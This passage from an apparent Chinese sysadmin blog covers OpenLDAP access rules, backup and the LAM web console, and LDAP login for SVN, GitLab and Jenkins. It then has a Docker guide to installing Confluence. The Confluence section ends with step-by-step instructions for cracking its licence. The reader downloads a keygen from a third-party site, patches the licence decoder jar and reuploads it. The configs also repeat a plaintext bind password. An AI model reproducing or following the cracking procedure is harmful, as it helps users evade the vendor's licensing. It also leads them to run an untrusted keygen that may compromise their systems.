<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> access to attrs=userPassword通过属性找到访问范围密码,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 超级管理员也就是我们ldap配置文件里写的rootdn：<span class="string">"cn=admin,dc=163,dc=com"</span>有写(write)权限；</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 由于管理员可能不止一个，我创建了个管理员组<span class="string">"ou=Admin,dc=163,dc=com"</span>把管理员统一都放到这个组下，管理员组下的所有用户（dn.children）有写权限；</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 匿名用户(anonymous)要通过验证(auth);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 自己(self)有对自己密码的写（write）权限，其他人(*)都没有权限(none).</span></span><br><span class="line">access to attrs=userPassword,shadowLastChange</span><br><span class="line">        by dn="cn=admin,dc=163,dc=com" write</span><br><span class="line">        by dn.children="ou=Admin,dc=163,dc=com" write</span><br><span class="line">        by anonymous auth</span><br><span class="line">        by self write</span><br><span class="line">        by * none</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> access to * 所有其他属性，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 超级管理员rootdn：<span class="string">"cn=admin,dc=163,dc=com"</span>有写(write)权限；</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 管理员<span class="string">"ou=Admin,dc=163,dc=com"</span>成员有写(write)权限；</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 其他人(*)只有读(<span class="built_in">read</span>)权限</span></span><br><span class="line">access to *</span><br><span class="line">        by dn="cn=admin,dc=163,dc=com" write</span><br><span class="line">        by dn.children="ou=Admin,dc=163,dc=com" write</span><br><span class="line">        by * read</span><br></pre></td></tr></table></figure>

<h2 id="备份和还原"><a href="#备份和还原" class="headerlink" title="备份和还原"></a>备份和还原</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ldapsearch -x -b <span class="string">"dc=163,dc=com"</span> -D <span class="string">"uid=authz,ou=Public,dc=163,dc=com"</span> -w <span class="string">"CzfdX629K7"</span> &gt; ldap.20180626.ldif</span></span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>-x</code>：进行简单的验证</li>
<li><code>-D</code>：用来绑定服务器的DN</li>
<li><code>-w</code>：绑定DN的密码</li>
<li><code>-b</code>：要查询的根节点<br>authz账号要有<code>&quot;dc=163,dc=com&quot;</code>的查询权限</li>
</ul>
<h3 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ldapadd -x -c -D <span class="string">"cn=admin,dc=163,dc=com"</span> -w <span class="string">"smile"</span> -f ldap.20180626.ldif</span></span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>-c</code>：出错后继续执行程序不终止，默认出错即停止</li>
<li><code>-f</code>：从文件内读取信息还原，而不是标准输入<br>还原的DN最好为管理员账号，至少也要有要LDAP的写入权限</li>
</ul>
<h2 id="web管理工具"><a href="#web管理工具" class="headerlink" title="web管理工具"></a>web管理工具</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.安装ldap-account-management</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> apt-get install ldap-account-manager</span></span><br></pre></td></tr></table></figure>

<p>2.浏览器访问</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://ip/lam</span><br></pre></td></tr></table></figure>

<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>lam的所有配置都可以在web端配置，不需要去服务器上修改一行代码，这个太好用了。</p>
<ol>
<li><p>浏览器访问后进入登录页面，我们点击右上角”LAM configuratrion”来在线编辑配置文件</p>
<p><img src="/articles/543cefa7/2.png" alt="img"></p>
</li>
<li><p>看到如下页面有两个选项：”Edit general settings”来编辑通用配置，默认密码lam，进入之后能配置密码策略、日志、管理员密码，最重要的是更新掉管理员密码，这个在后边”Manage server profiles”管理的时候需要提供；”Edit server profiles”来编辑服务器配置，我们先来编辑服务器配置</p>
<p><img src="/articles/543cefa7/3.png" alt="img"></p>
</li>
<li><p>进入如下页面，输入默认密码lam即可编辑配置，这里要说明一下的是红框标注的”Manage server profiles”可以对服务器的配置文件进行配置，例如增加、删除配置文件、配置文件重命名，最重要的是可以设置配置文件密码（也就是我们刚输入的密码lam，但修改密码需要管理员密码，后边配置）</p>
<p><img src="/articles/543cefa7/4.png" alt="img"></p>
</li>
<li><p>输入密码lam后就正式进入服务器配置页，看到第一个标签”General setting”，（可以先改下语言简体中文保存，整站就给汉化啦，英文渣渣看起来就非常方便了），基本配置都看的很清晰了，主要是Tree suffix配置为自己的DC可以了</p>
<p><img src="/articles/543cefa7/5.png" alt="img"></p>
</li>
<li><p>接着来看这个页面，”security settings”非常重要，配置以何种方式登录web控制台，默认为Fixed list模式，就是下边列表里配置的dn可以登录，我们LDAP里还没有任何一个账号（当我们创建了账号之后可以选择”LDAP serch”的模式，让普通账号也能登录以修改自己的密码），这里要选择fixed list模式并配置为我们LDAP的rootdn，设置一个密码登录之后创建账号等操作</p>
<p><img src="/articles/543cefa7/6.png" alt="img"></p>
</li>
<li><p>接下来就是”Account types”标签页的配置，这里配置我们登录web控制显示的标签，我这里只需要他显示用户，就把Group之类的都删除了，保留了User</p>
<p><img src="/articles/543cefa7/7.png" alt="img"></p>
</li>
<li><p>“Modules”页面配置上一个具体每个account type显示的模块</p>
<p><img src="/articles/543cefa7/8.png" alt="img"></p>
</li>
<li><p>“Models setting”页面配置models具体要显示的内容，不得不说配置非常详细</p>
<p><img src="/articles/543cefa7/9.png" alt="img"></p>
</li>
<li><p>经过上边的配置就可以进入控制台新建账号了，新建账号之前一个有用的操作是修改用户的默认RDN标致为uid，更高位置在登录web控制台后右上角配置文件编辑器里边</p>
<p><img src="/articles/543cefa7/10.png" alt="img"></p>
</li>
<li><p>基本配置完成，可以开始使用了，中文界面比较清晰，无需过多解释啦。</p>
</li>
</ol>
<h1 id="SVN集成OpenLDAP认证"><a href="#SVN集成OpenLDAP认证" class="headerlink" title="SVN集成OpenLDAP认证"></a>SVN集成OpenLDAP认证</h1><ul>
<li>系统环境：Debian8.4</li>
<li>svn部署环境：Apache2.4 + Subversion</li>
</ul>
<ol>
<li>Apache开启LDAP相关模块</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> a2enmod ldap</span></span><br><span class="line">Enabling module ldap.</span><br><span class="line">To activate the new configuration, you need to run:</span><br><span class="line">  service apache2 restart</span><br><span class="line"><span class="meta">#</span><span class="bash"> a2enmod authnz_ldap</span></span><br><span class="line">Considering dependency ldap for authnz_ldap:</span><br><span class="line">Module ldap already enabled</span><br><span class="line">Enabling module authnz_ldap.</span><br><span class="line">To activate the new configuration, you need to run:</span><br><span class="line">  service apache2 restart</span><br></pre></td></tr></table></figure>

<ol>
<li>修改vhost配置文件，添加对ldap的支持</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Virtualhost *:8088&gt;</span><br><span class="line">    DocumentRoot /home/svn/repos/</span><br><span class="line">    ServerName svn.domain.com</span><br><span class="line"></span><br><span class="line">    &lt;Location /ne/&gt;</span><br><span class="line">        DAV svn</span><br><span class="line">        SVNListParentPath on</span><br><span class="line">        SVNParentPath &quot;/home/svn/repos&quot;</span><br><span class="line"></span><br><span class="line">        AuthType Basic</span><br><span class="line">        AuthName &quot;Private Subversion Repository&quot;</span><br><span class="line"></span><br><span class="line">        #AuthUserFile &quot;/etc/subversion/dav_svn.passwd&quot;</span><br><span class="line">        AuthzSVNAccessFile &quot;/etc/subversion/dav_svn.authz&quot;</span><br><span class="line"></span><br><span class="line">        # use LDAP auth</span><br><span class="line">        AuthBasicProvider ldap</span><br><span class="line">        AuthLDAPBindAuthoritative on</span><br><span class="line">        AuthLDAPURL &quot;ldap://ldap.domain.com/dc=domain,dc=com?uid?sub?(objectclass=*)&quot;</span><br><span class="line">        AuthLDAPBindDN &quot;uid=authz,ou=Public,dc=domain,dc=com&quot;</span><br><span class="line">        AuthLDAPBindPassword &quot;CzfdX629K7&quot;</span><br><span class="line"></span><br><span class="line">        Require ldap-user</span><br><span class="line"></span><br><span class="line">    &lt;/Location&gt;</span><br><span class="line">&lt;/Virtualhost&gt;</span><br></pre></td></tr></table></figure>

<h2 id="主要LDAP配置文件详解："><a href="#主要LDAP配置文件详解：" class="headerlink" title="主要LDAP配置文件详解："></a>主要LDAP配置文件详解：</h2><p><strong>AuthType</strong>：验证类型，Basic使用账号密码验证</p>
<p><strong>AuthName</strong>：提示字符串</p>
<p><strong>AuthBasicProvider</strong>：使用ldap验证</p>
<p><strong>AuthLDAPBindAuthoritative</strong>：on表示只要求验证ldap用户，别的不认，off则可以使用svn的账号和ldap混合账号登录</p>
<ul>
<li>apache2.2中配置是<code>AuthzLDAPAuthoritative</code>，到2.4中改为了<code>AuthLDAPBindAuthoritative</code></li>
<li>但在实际应用中发现并么有什么用，设置为off后ldap认证失败也不会去找AuthzSVNAccessFile，或许是我姿势不对，有知道原因的烦请告知</li>
</ul>
<p><strong>Require</strong>：ldap-user或valid-user</p>
<p><strong>AuthLDAPURL | AuthLDAPBindDN | AuthLDAPBindPassword</strong>： 用于查找用户的账号密码，一般设置个只读账号即可</p>
<ul>
<li><p>AuthLDAPURL：[协议名称]://[ip地址或者域名]:[端口号]/[baseDN]?[attr]?[scope]?[filter]</p>
</li>
<li><ul>
<li>baseDN：指定开始搜索的节点的名称</li>
<li>attr：就是用户输入的属性键，默认是“uid”</li>
<li>scope: one,sub,base，默认是sub</li>
<li>filter：过滤器，默认是objectclass=*</li>
</ul>
</li>
</ul>
<h2 id="LDAP服务器认证过程"><a href="#LDAP服务器认证过程" class="headerlink" title="LDAP服务器认证过程"></a>LDAP服务器认证过程</h2><p>可能只看配置文件不能了解LDAP认证的原理，接下来我们详细讨论下LDAP是如何认证的</p>
<p>客户端(httpd)使用提供的URL(AuthLDAPURL)进行验证的时候，并不是直接验证输入的账号密码，因为LDAP服务器在验证的时候要使用DN(每个节点用户的唯一标识)和密码来进行登陆验证的，但是DN一般来说比较长，诸如:“cn=xxx,ou=xxx,ou=xxx,dc=xxx,dc=xxx”，这种光输入的时候就烦死了，所以要想使用简短的用户名来登陆的时候，一般的做法是在某个节点用户上添加一个属性，比如mobile(手机号),Email(邮箱),user name或者uid(用户名),然后使用这个属性的值来登陆（大部分情况下都用uid，我们也是这么使用的）。</p>
<p>当用户输入这个属性值（一般uid）和密码的时候，客户端(httpd服务器)先使用AuthLDAPBindDN和AuthLDAPBindPassword作为用户名和密码登陆，根据AuthLDAPURL指定的查询规则来查找用户输入的属性的值有没有，如果查找的条数为0或者大于1，则返回错误，如果查找的条数等于1，则使用查找到的这个条目的DN和用户输入的密码进行登陆验证，成功则成功，失败则失败。</p>
<p>总结一下LDAP的认证过程分为两部：</p>
<ol>
<li>搜索用户是否存在LDAP服务器中：配置文件中配置的AuthLDAPBindDN和AuthLDAPBindPassword两个属性主要目的就是为了登陆LDAP服务器搜索属性(uid)是否只有一条，如果服务器允许匿名访问则这两个配置可以不需要，但一般为了安全性都会关闭LDAP的匿名访问，新建一个只读权限的账号配置到这里即可</li>
<li>使用用户输入的属性值（uid）和密码进行登陆验证</li>
</ol>
<h1 id="GitLab集成OpenLDAP认证"><a href="#GitLab集成OpenLDAP认证" class="headerlink" title="GitLab集成OpenLDAP认证"></a>GitLab集成OpenLDAP认证</h1><h2 id="GitLab配置"><a href="#GitLab配置" class="headerlink" title="GitLab配置"></a>GitLab配置</h2><ol>
<li>修改配置文件gitlab.yml</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ldap:</span></span><br><span class="line"><span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">servers:</span></span><br><span class="line"><span class="attr">  main:</span> </span><br><span class="line"><span class="attr">    label:</span> <span class="string">'LDAP'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    host:</span> <span class="string">'ldap.domain.com'</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">389</span></span><br><span class="line"><span class="attr">    uid:</span> <span class="string">'uid'</span></span><br><span class="line"><span class="attr">    method:</span> <span class="string">'plain'</span></span><br><span class="line"><span class="attr">    bind_dn:</span> <span class="string">'uid=authz,ou=Public,dc=domain,dc=com'</span></span><br><span class="line"><span class="attr">    password:</span> <span class="string">'CzfdX629K7'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    timeout:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    active_directory:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">    allow_username_or_email_login:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    block_auto_created_users:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    base:</span> <span class="string">'dc=domain,dc=com'</span></span><br><span class="line"><span class="attr">    user_filter:</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>

<ol>
<li>重启GitLab服务，看到页面已经有LDAP的登录选项了</li>
</ol>
<p><img src="/articles/543cefa7/11.png" alt="img"></p>
<h2 id="重要配置参数解释"><a href="#重要配置参数解释" class="headerlink" title="重要配置参数解释"></a>重要配置参数解释</h2><p>仔细阅读上一篇svn集成LDAP认证的文章这些参数会更好理解</p>
<ul>
<li><strong>host</strong>：LDAP服务器地址</li>
<li><strong>port</strong>：LDAP服务端口</li>
<li><strong>uid</strong>：以哪个属性作为验证属性，可以为uid、cn等，我们使用uid</li>
<li><strong>method</strong>：如果开启了tls或ssl则填写对应的tls或ssl，都没有就填写plain</li>
<li><strong>bind_dn</strong>：search搜索账号信息的用户完整bind（需要一个有read权限的账号验证通过后搜索用户输入的用户名是否存在）</li>
<li><strong>password</strong>：bind_dn用户的密码，<code>bind_dn</code>和<code>password</code>两个参数登录LDAP服务器搜索用户</li>
<li><strong>active_directory</strong>：LDAP服务是否是windows的AD，我们是用的OpenLDAP，这里写false</li>
<li><strong>allow_username_or_email_login</strong>：是否允许用户名或者邮箱认证，如果是则用户输入用户名或邮箱都可</li>
<li><strong>base</strong>：从哪个位置搜索用户，例如允许登录GitLab的用户都在ou gitlab里，name这里可以写<code>ou=gitlab,dc=domain,dc=com</code></li>
<li><strong>filter</strong>：添加过滤属性，例如只过滤employeeType为developer的用户进行认证，可以设置<code>employeeType=developer</code></li>
</ul>
<h1 id="Jenkins集成OpenLDAP认证"><a href="#Jenkins集成OpenLDAP认证" class="headerlink" title="Jenkins集成OpenLDAP认证"></a>Jenkins集成OpenLDAP认证</h1><h2 id="安装LDAP插件"><a href="#安装LDAP插件" class="headerlink" title="安装LDAP插件"></a>安装LDAP插件</h2><p>使用LDAP认证需要安装LDAP插件，安装插件有两种方法：</p>
<h3 id="方法一：后台插件管理里直接安装"><a href="#方法一：后台插件管理里直接安装" class="headerlink" title="方法一：后台插件管理里直接安装"></a>方法一：后台插件管理里直接安装</h3><ul>
<li>优点：简单方便，不需要考虑插件依赖问题</li>
<li>缺点：因为网络等各种问题安装不成功</li>
</ul>
<p>安装方法：登录Jenkins –&gt; 系统管理 –&gt; 插件管理 –&gt; 可选插件 –&gt; 搜索LDAP –&gt; 选中 –&gt; 直接安装 –&gt; 安装完成重启</p>
<p><img src="/articles/543cefa7/12.png" alt="img"></p>
<p>因我们已经安装过了LDAP插件，所有这里搜索不到LDAP插件，只有LDAP Email插件</p>
<p>如果安装失败，网上也有说在插件管理 –&gt; 高级 –&gt; 升级站点里替换URL为<code>https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json</code>的，但是我替换了之后依然没有成功，最后还是使用方法二安装成功的</p>
<h3 id="方法二：官网下载安装文件后台上传"><a href="#方法二：官网下载安装文件后台上传" class="headerlink" title="方法二：官网下载安装文件后台上传"></a>方法二：官网下载安装文件后台上传</h3><ul>
<li>优点：一定可以安装成功的</li>
<li>缺点：麻烦，要去官网找插件并解决依赖</li>
</ul>
<p>插件下载地址：<a href="https://updates.jenkins-ci.org/download/plugins/" target="_blank" rel="noopener">https://updates.jenkins-ci.org/download/plugins/</a></p>
<p>安装方法：官网下载插件 –&gt; 登录Jenkins –&gt; 系统管理 –&gt; 插件管理 –&gt; 高级 –&gt; 上传插件 –&gt; 选择文件 –&gt; 上传 –&gt; 安装完成后重启</p>
<p><img src="/articles/543cefa7/13.png" alt="img"></p>
<p>上传插件安装可能会失败，大部分都是提示你当前插件依赖某些插件，只需要下载全部依赖插件，按照顺序上传安装即可，LDAP插件安装完成后，所有依赖的插件如下：</p>
<p><img src="/articles/543cefa7/14.png" alt="LDAP依赖插件列表"></p>
<h2 id="配置LDAP认证"><a href="#配置LDAP认证" class="headerlink" title="配置LDAP认证"></a>配置LDAP认证</h2><p>登录Jenkins –&gt; 系统管理 –&gt; 全局安全配置</p>
<p><img src="/articles/543cefa7/15.png" alt></p>
<p>访问控制选择“LDAP”，Server输入LDAP服务器地址，有其他配置可以点击“Advanced Server Configuration…”</p>
<p><img src="/articles/543cefa7/16.png" alt></p>
<p><strong>Server</strong>：服务器地址，可以直接填写LDAP服务器的主机名或IP，例如<code>ldap.domain.com</code>（默认端口389），或者<code>ldap.domain.com:1389</code>，如果用了SSL，可以填写<code>ldaps://ldap.domain.com</code>（默认端口636），或者<code>ldaps://ldap.domain.com:1636</code></p>
<p><img src="/articles/543cefa7/17.png" alt></p>
<p><strong>root DN</strong>：这里的root DN只是指搜索的根，并非LDAP服务器的root dn。由于LDAP数据库的数据组织结构类似一颗大树，而搜索是递归执行的，理论上，我们如果从子节点（而不是根节点）开始搜索，因为缩小了搜索范围那么就可以获得更高的性能。这里的root DN指的就是这个子节点的DN，当然也可以不填，表示从LDAP的根节点开始搜索</p>
<p><strong>User search base</strong>：这个配置也是为了缩小LDAP搜索的范围，例如Jenkins系统只允许ou为Admin下的用户才能登陆，那么你这里可以填写<code>ou=Admin</code>，这是一个相对的值，相对于上边的root DN，例如你上边的root DN填写的是<code>dc=domain,dc=com</code>，那么user search base这里填写了<code>ou=Admin</code>，那么登陆用户去LDAP搜索时就只会搜索<code>ou=Admin,dc=domain,dc=com</code>下的用户了</p>
<p><strong>User search filter</strong>：这个配置定义登陆的“用户名”对应LDAP中的哪个字段，如果你想用LDAP中的uid作为用户名来登录，那么这里可以配置为<code>uid={0}</code>（{0}会自动的替换为用户提交的用户名），如果你想用LDAP中的mail作为用户名来登录，那么这里就需要改为<code>mail={0}</code>。在测试的时候如果提示你<code>user xxx does not exist</code>，而你确定密码输入正确时，就要考虑下输入的用户名是不是这里定义的这个值了</p>
<p><strong>Group search base</strong>：参考上边<code>User search base</code>解释</p>
<p><strong>Group search filter</strong>：这个配置允许你将过滤器限制为所需的objectClass来提高搜索性能，也就是说可以只搜索用户属性中包含某个objectClass的用户，这就要求你对你的LDAP足够了解，一般我们也不配置</p>
<p><strong>Group membership</strong>：没配置，没有详细研究</p>
<p><strong>Manager DN</strong>：这个配置在你的LDAP服务器不允许匿名访问的情况下用来做认证（详细的认证过程参考文章LDAP落地实战（二）：SVN集成OpenLDAP认证中关于LDAP服务器认证过程的讲解），通常DN为<code>cn=admin,dc=domain,dc=com</code>这样</p>
<p><strong>Manager Password</strong>：上边配置dn的密码</p>
<p><strong>Display Name LDAP attribute</strong>：配置用户的显示名称，一般为显示名称就配置为uid，如果你想显示其他字段属性也可以这里配置，例如mail</p>
<p><strong>Email Address LDAP attribute</strong>：配置用户Email对应的字段属性，一般没有修改过的话都是mail，除非你用其他的字段属性来标识用户邮箱，这里可以配置</p>
<p>下边还有一些配置如：环境变量Environment Properties、servlet容器代理等，很少用就不多解释了。有一个配置<code>Enable cache</code>可能会用得到，当你的LDAP数据量很大或者LDAP服务器性能较差时，可以开启缓存，配置缓存条数和过期时间，那么在过期时间内新请求优先查找本地缓存认证，认证通过则不会去LDAP服务器请求，以减轻LDAP服务器的压力</p>
<p><img src="/articles/543cefa7/18.png" alt></p>
<p>配置完成后可以点击下方的“Test LDAP sttings”来测试配置的准确性</p>
<p><img src="/articles/543cefa7/19.png" alt></p>
<p>这里输入的用户名就是你上边配置的<code>User search filter</code>里定义的LDAP中的属性，密码就是LDAP的密码</p>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>配置完成并测试通过后就可以用LDAP直接登录了，注意：启用了LDAP登录后将无法再用之前的登录方式（例如本地认证）登录</p>
<p><img src="/articles/543cefa7/20.png" alt></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker中安装Wiki软件Confluence</title>
    <url>/articles/ac0d3377.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文通过在centos 7上Docker安装Wiki软件Confluence，并通过破解，让公司有一个稳定高效的文档平台。</p>
<a id="more"></a>

<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><h4 id="yum安装docker"><a href="#yum安装docker" class="headerlink" title="yum安装docker"></a>yum安装docker</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum update # 更新yum</span><br><span class="line">yum install docker # yum安装docker`</span><br></pre></td></tr></table></figure>

<h4 id="开启镜像加速"><a href="#开启镜像加速" class="headerlink" title="开启镜像加速"></a>开启镜像加速</h4><p>由于国内网络问题拉取 Docker 镜像会十分缓慢，所以可以添加网易镜像地址：<a href="http://hub-mirror.c.163.com" target="_blank" rel="noopener">http://hub-mirror.c.163.com</a> 加速。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<p>将其中的内容替换为如下，当然你可以添加其它镜像地址。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"registry-mirrors"</span>: [<span class="string">"http://hub-mirror.c.163.com"</span>]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker --version # 查看docker版本</span><br><span class="line">service docker start # 启动docker</span><br><span class="line">ps -ef | grep docker # 查看docker进程是否正常启动</span><br></pre></td></tr></table></figure>

<h2 id="安装数据库PostgreSQL"><a href="#安装数据库PostgreSQL" class="headerlink" title="安装数据库PostgreSQL"></a>安装数据库PostgreSQL</h2><p>安装 PostgreSQL 所使用的镜像在：<a href="https://hub.docker.com/_/postgres/" target="_blank" rel="noopener">https://hub.docker.com/_/postgres/</a></p>
<h4 id="安装PostgreSQL"><a href="#安装PostgreSQL" class="headerlink" title="安装PostgreSQL"></a>安装PostgreSQL</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name postgresdb -p 5432:5432 -e POSTGRES_PASSWORD=W**** -d postgres</span><br></pre></td></tr></table></figure>

<p>注：</p>
<ol>
<li>-p 5432:5432 选项是可选的，因为在后面启动Confluence容器的时候，postgresdb这个容器会以别名db连接到confluence容器，也就是说对confluence这个容器来说，可以通过db:5432的网络地址访问到postgresql服务，不需要在主机上开放5432端口。</li>
<li>W**** 是密码需要设置成你需要的密码</li>
</ol>
<h4 id="进入docker容器并创建confluence数据库"><a href="#进入docker容器并创建confluence数据库" class="headerlink" title="进入docker容器并创建confluence数据库"></a>进入docker容器并创建confluence数据库</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it postgresdb bash # 进入docker容器</span><br><span class="line">psql -U postgres </span><br><span class="line">\l</span><br><span class="line">CREATE DATABASE confluence WITH OWNER postgres; </span><br><span class="line">\q</span><br></pre></td></tr></table></figure>

<h2 id="安装wiki-Confluence"><a href="#安装wiki-Confluence" class="headerlink" title="安装wiki Confluence"></a>安装wiki Confluence</h2><p>下文中使用的镜像 <a href="https://hub.docker.com/r/cptactionhank/atlassian-confluence/" target="_blank" rel="noopener">https://hub.docker.com/r/cptactionhank/atlassian-confluence/ </a></p>
<p>也可以使用 <a href="https://github.com/jgrodziski/docker-confluence/blob/master/Dockerfile" target="_blank" rel="noopener">https://github.com/jgrodziski/docker-confluence/blob/master/Dockerfile</a> 这个镜像他把PostgreSQL和 Confluence包含在一个image里面，参考：<a href="http://blogs.atlassian.com/2013/11/docker-all-the-things-at-atlassian-automation-and-wiring/" target="_blank" rel="noopener">http://blogs.atlassian.com/2013/11/docker-all-the-things-at-atlassian-automation-and-wiring/</a></p>
<h4 id="安装wiki-Confluence-1"><a href="#安装wiki-Confluence-1" class="headerlink" title="安装wiki Confluence"></a>安装wiki Confluence</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name confluence -p 8090:8090 --link postgresdb:db --user root:root cptactionhank /atlassian-confluence:latest</span><br></pre></td></tr></table></figure>

<p>以上命令将在主机上开放8090端口，如果想使用80端口访问wiki请使用一下命令安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name confluence -p 80:8090 --link postgresdb:db --user root:root cptactionhank /atlassian-confluence:latest</span><br></pre></td></tr></table></figure>

<h4 id="检查confluence是否启动"><a href="#检查confluence是否启动" class="headerlink" title="检查confluence是否启动"></a>检查confluence是否启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps # 列出运行的容器</span><br></pre></td></tr></table></figure>

<p>可以看到刚才安装的两个容器，启动 wiki confluence</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker start postgresdb # 启动数据库 </span><br><span class="line">postgresdb</span><br><span class="line">docker start confluence # 启动 Wiki confluence``docker </span><br><span class="line">ps # 列出运行的容器</span><br></pre></td></tr></table></figure>

<p>可以看到 wiki confluence已经启动</p>
<h4 id="浏览器访问"><a href="#浏览器访问" class="headerlink" title="浏览器访问"></a>浏览器访问</h4><p><a href="http://ip/就可以看到Confluence的配置页面" target="_blank" rel="noopener">http://ip/就可以看到Confluence的配置页面</a></p>
<h2 id="破解Confluence"><a href="#破解Confluence" class="headerlink" title="破解Confluence"></a>破解Confluence</h2><h4 id="访问页面记录Server-ID"><a href="#访问页面记录Server-ID" class="headerlink" title="访问页面记录Server ID"></a>访问页面记录Server ID</h4><p><img src="/articles/ac0d3377/1.png" alt></p>
<p><img src="/articles/ac0d3377/2.png" alt></p>
<h4 id="停止-confluence"><a href="#停止-confluence" class="headerlink" title="停止 confluence"></a>停止 confluence</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker stop confluence #停止 confluence 容器</span><br></pre></td></tr></table></figure>

<h4 id="进入confluence-容器-查找decoder-jar文件"><a href="#进入confluence-容器-查找decoder-jar文件" class="headerlink" title="进入confluence 容器, 查找decoder.jar文件"></a>进入confluence 容器, 查找decoder.jar文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it confluence /bin/bash # 进入docker容器 confluence</span><br><span class="line">su - # 切换到root账户</span><br><span class="line">find -name "*decoder*" # 查找名称中包括 decoder 的文件</span><br></pre></td></tr></table></figure>

<p><img src="/articles/ac0d3377/3.png" alt></p>
<p>将decoder.jar文件从容器中复制出来，其中 “confluence:” 是Wiki confluence容器名称，atlassian-extras-decoder-v2-3.3.0.jar 是安装版本wiki的decode文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp  confluence:/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.3.0.jar .</span><br></pre></td></tr></table></figure>

<h4 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h4><ol>
<li><ol>
<li><p>下载 atlassian-extras-decoder-v2-3.3.0.jar 文件到windows上</p>
</li>
<li><p>将文件名改为 “atlassian-extras-2.4.jar” 破解工具只识别这个文件名</p>
</li>
<li><p>下载破解文件 <a href="http://wiki.wuyijun.cn/download/attachments/2327034/51CTO下载-Confluence.zip" target="_blank" rel="noopener">http://wiki.wuyijun.cn/download/attachments/2327034/51CTO%E4%B8%8B%E8%BD%BD-Confluence.zip</a></p>
</li>
<li><p>解压缩此文件夹，dos命令行进入此文件夹，目录需根据你的实际情况修改 C:\Users\lrs\Desktop\wiki\51CTO下载-Confluence\confluence5.1-crack\confluence5.1-crack\iNViSiBLE</p>
</li>
<li><p>执行 java -jar confluence_keygen.jar 运行破解文件</p>
</li>
<li><p>填入 name ，server id 处输入步骤1中得到的id，点击 “gen” 生成key</p>
<p><img src="/articles/ac0d3377/4.png" alt></p>
</li>
<li><p>点击 patch，选择刚才改名为  “atlassian-extras-2.4.jar” 的jar包，显示 “jar success fully patched” 则破解成功</p>
<p>注意：path前先删除atlassian-extras-2.4.bak文件否则path失败</p>
<p><img src="/articles/ac0d3377/5.png" alt></p>
</li>
<li><p>将 “atlassian-extras-2.4.jar” 文件名改回原来的 “atlassian-extras-decoder-v2-3.3.0.jar”</p>
</li>
<li><p>复制key中的内容备用</p>
</li>
<li><p>将 “atlassian-extras-decoder-v2-3.3.0.jar” 文件上传回服务器</p>
</li>
</ol>
</li>
</ol>
